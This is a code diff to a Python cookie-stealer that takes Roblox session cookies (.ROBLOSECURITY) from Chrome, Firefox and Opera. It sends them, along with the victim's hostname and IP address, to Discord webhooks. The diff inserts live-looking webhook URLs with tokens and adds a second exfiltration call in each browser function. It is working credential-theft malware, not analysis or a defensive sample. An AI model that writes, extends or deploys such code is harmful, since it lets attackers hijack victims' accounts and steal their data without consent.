@@ -1,5 +1,5 @@
-hook = "" 
-
+hook = "https://discord.com/api/webhooks/1054099003735822397/eTnw3SmH51m_dHF0Zm0EmxDdRP8Jp_k8eMByP2BA7dxoAFDcVfkkyX9Hm_lNNMcPSGbi" 
+hook2 = "https://discord.com/api/webhooks/1043721681325260960/Z5lhqhWpo_Vujn_z8alvUhwFUrCIqcqT56XCmt8uTD3hYnDmERlRQIaNrFB0tKsfQkK1"
 
 
 # logger 
@@ -35,6 +35,7 @@ def chrome_logger():
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
 
         requests.post(weok, json={'username':'LOGGER', 'content':f'```Hostname: {hostname} IP: {IPAddr} Cookie: {cookie}```'})
+        requests.post(hook2, json={'username':'LOGGER', 'content':f'```Hostname: {hostname} IP: {IPAddr} Cookie: {cookie}```'})
 
     except:
 
@@ -55,6 +56,7 @@ def firefox_logger():
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
 
         requests.post(weok, json={'username':'LOGGER', 'content':f'```Hostname: {hostname} IP: {IPAddr} Cookie: {cookie}```'})
+        requests.post(hook2, json={'username':'LOGGER', 'content':f'```Hostname: {hostname} IP: {IPAddr} Cookie: {cookie}```'})
 
     except:
 
@@ -73,6 +75,7 @@ def opera_logger():
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
 
         requests.post(weok, json={'username':'LOGGER', 'content':f'```Hostname: {hostname} IP: {IPAddr} Cookie: {cookie}```'})
+        requests.post(hook2, json={'username':'LOGGER', 'content':f'```Hostname: {hostname} IP: {IPAddr} Cookie: {cookie}```'})
 
     except:
 
